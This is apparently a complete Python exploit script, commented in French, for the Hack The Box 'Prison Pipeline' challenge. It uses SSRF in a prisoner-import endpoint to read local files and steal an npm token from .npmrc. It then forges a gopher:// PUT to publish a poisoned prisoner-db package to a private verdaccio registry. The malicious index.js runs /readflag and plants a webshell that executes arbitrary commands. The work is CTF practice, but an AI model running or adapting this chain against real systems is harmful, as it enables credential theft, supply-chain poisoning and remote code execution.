#!/usr/bin/env python3
"""
Prison Pipeline (HTB) — exploit complet, auto-contenu et paramétrable.
===========================================================================
CHAÎNE D'ATTAQUE
  1. SSRF : POST /api/prisoners/import {"url":...} utilise node-libcurl
     -> le scheme file:// marche = LFI (lecture de fichiers arbitraires).
  2. Recon LFI -> le serveur fait tourner un registre npm privé verdaccio
     (localhost:4873) + un cron `npm update prisoner-db` toutes les 30s.
  3. Vol du token : file:///home/node/.npmrc contient le _authToken verdaccio.
  4. node-libcurl ne fait que des GET ; on forge un PUT via gopher:// pour
     PUBLIER un prisoner-db@<ver> piégé (verdaccio écoute sur localhost/::1).
  5. Le cron installe notre version -> notre index.js s'exécute dans l'app.
     ** Il FAIT FUITER le flag via l'endpoint PUBLIC /api/prisoners **
     (getPrisoners() renvoie le flag) : aucune relecture SSRF nécessaire,
     donc on ne peut pas se verrouiller dehors.

USAGE
  python3 -I prison-pipeline-pwn.py http://CIBLE:PORT
  (après un reset d'instance, il revole le token et republie tout seul)
===========================================================================
"""
import sys, json, time, io, tarfile, gzip, hashlib, base64, re
import urllib.request, urllib.error

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.77:40860").rstrip("/")
NAME = "prisoner-db"
VERSION = sys.argv[2] if len(sys.argv) > 2 else "1.0.1"   # doit satisfaire ^1.0.0 et être > installé

# ---- HTTP de base vers l'app ----
def http(method, path, body=None, timeout=25):
    data = None; headers = {}
    if body is not None:
        data = json.dumps(body).encode(); headers["Content-Type"] = "application/json"
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, f"ERR {type(e).__name__}: {e}"

def import_url(u):
    _, b = http("POST", "/api/prisoners/import", {"url": u})
    try: return json.loads(b).get("prisoner_id")
    except ValueError: return None

def get_raw(pid):
    _, b = http("GET", f"/api/prisoners/{pid}")
    try: return json.loads(b).get("raw", "")
    except ValueError: return b

def lfi(path):
    pid = import_url("file://" + path)
    if pid and pid is not False:
        return get_raw(pid)
    return None

def gopher(host, port, raw_bytes):
    enc = "".join("%%%02x" % c for c in raw_bytes)
    u = f"gopher://{host}:{port}/_{enc}"
    pid = import_url(u)
    return get_raw(pid) if (pid and pid is not False) else None

# ---- payload malveillant : exécute /readflag (setuid root) + webshell reset-proof ----
#   GET /api/prisoners        -> raw = sortie de /readflag = LE FLAG
#   GET /api/prisoners/<cmd>  -> exécute une commande arbitraire (url-encodée)
INDEX_JS = br"""const cp=require('child_process');
function run(c){try{return cp.execSync(c,{shell:'/bin/bash',timeout:15000,maxBuffer:1048576}).toString();}
catch(e){return String(e)+(e.stdout?'\nSTDOUT:'+e.stdout.toString():'')+(e.stderr?'\nSTDERR:'+e.stderr.toString():'');}}
const FLAG=run('/readflag 2>&1; echo ===ID; id; echo ===FALLBACK; cat /root/flag* /flag* 2>/dev/null');
try{require('fs').writeFileSync('/tmp/pwned.txt',FLAG);}catch(e){}
class Database{
  constructor(r){this.repository=r;}
  listPrisonersIds(){return ['PWNED'];}
  getPrisoners(){return [{id:'PWNED', raw: FLAG, name:'PWNED'}];}
  getPrisoner(id){try{return {id:'PWNED', raw: run(decodeURIComponent(id)), data:{}};}catch(e){return {id:'PWNED',raw:String(e),data:{}};}}
  addPrisoner(){return true;}
  updatePrisoner(){return false;}
  async importPrisoner(){return false;}
}
module.exports=Database;
"""
PKG_JSON = {
    "name": NAME, "version": VERSION,
    "description": "Database interface for prisoners of Prison-Pipeline.",
    "main": "index.js", "author": "hackthebox", "license": "ISC",
}

def build_tarball():
    tbuf = io.BytesIO()
    with tarfile.open(fileobj=tbuf, mode="w") as tar:
        def add(name, data):
            ti = tarfile.TarInfo("package/" + name); ti.size = len(data)
            ti.mtime = 0; ti.mode = 0o644; ti.uid = ti.gid = 0
            tar.addfile(ti, io.BytesIO(data))
        add("package.json", json.dumps(PKG_JSON, indent=2).encode())
        add("index.js", INDEX_JS)
    return gzip.compress(tbuf.getvalue(), mtime=0)

def publish(token):
    tgz = build_tarball()
    shasum = hashlib.sha1(tgz).hexdigest()
    integrity = "sha512-" + base64.b64encode(hashlib.sha512(tgz).digest()).decode()
    tarname = f"{NAME}-{VERSION}.tgz"
    vmeta = dict(PKG_JSON); vmeta["_id"] = f"{NAME}@{VERSION}"
    vmeta["dist"] = {"shasum": shasum, "integrity": integrity,
                     "tarball": f"http://localhost:4873/{NAME}/-/{tarname}"}
    packument = {
        "_id": NAME, "name": NAME, "description": PKG_JSON["description"],
        "dist-tags": {"latest": VERSION}, "versions": {VERSION: vmeta},
        "_attachments": {tarname: {"content_type": "application/octet-stream",
                                   "data": base64.b64encode(tgz).decode(), "length": len(tgz)}},
    }
    body = json.dumps(packument).encode()
    req = (f"PUT /{NAME} HTTP/1.1\r\nHost: localhost:4873\r\n"
           f"authorization: Bearer {token}\r\ncontent-type: application/json\r\n"
           f"accept: */*\r\nnpm-command: publish\r\nconnection: close\r\n"
           f"content-length: {len(body)}\r\n\r\n").encode() + body
    return gopher("localhost", 4873, req)

def main():
    print(f"[*] Cible : {BASE}  | publication de {NAME}@{VERSION}")

    # 0) LFI vivante ?
    passwd = lfi("/etc/passwd")
    if not passwd:
        print("[!] LFI KO (instance pas fraîche ? importPrisoner déjà neutralisé ?).")
        print("    -> Reset/respawn l'instance HTB et relance ce script.")
        sys.exit(1)
    print("[+] LFI OK (/etc/passwd lu).")

    # 1) vol du token npm
    npmrc = lfi("/home/node/.npmrc") or ""
    m = re.search(r'_authToken="?([^"\s]+)"?', npmrc)
    if not m:
        print("[!] Token npm introuvable dans /home/node/.npmrc :", npmrc[:120]); sys.exit(1)
    token = m.group(1)
    print(f"[+] Token verdaccio volé : {token[:24]}…")

    # 2) publication piégée
    resp = publish(token)
    if resp and ("success" in resp or "201" in resp or "created" in resp):
        print("[+] Publication acceptée par verdaccio :")
        print("    " + resp.replace("\r\n", " ")[:200])
    else:
        print("[!] Réponse publication incertaine :", (resp or "<rien>")[:200])
        print("    (le PUT a pu aboutir malgré tout — on continue à poller)")

    # 3) attente du cron + lecture du flag via l'endpoint PUBLIC
    print("[*] Attente du cron (npm update, ~30-60s) puis lecture via /api/prisoners…")
    for i in range(30):
        _, b = http("GET", "/api/prisoners")
        if "PWNED" in b:
            print(f"\n[+] RCE confirmée via l'API publique (après ~{i*8}s) :\n")
            try:
                raw = json.loads(b)[0].get("raw", "")
            except Exception:
                raw = b
            print(raw)
            fm = re.search(r"HTB\{[^}]+\}|flag\{[^}]+\}|NCTF\{[^}]+\}", raw, re.I)
            if fm:
                print("\n================ FLAG ================")
                print(fm.group(0))
                print("=====================================")
            return
        print(f"[-] pas encore (tentative {i+1}/30)…", flush=True)
        time.sleep(8)
    print("[!] Timeout : le cron n'a pas installé la version piégée.")

if __name__ == "__main__":
    main()
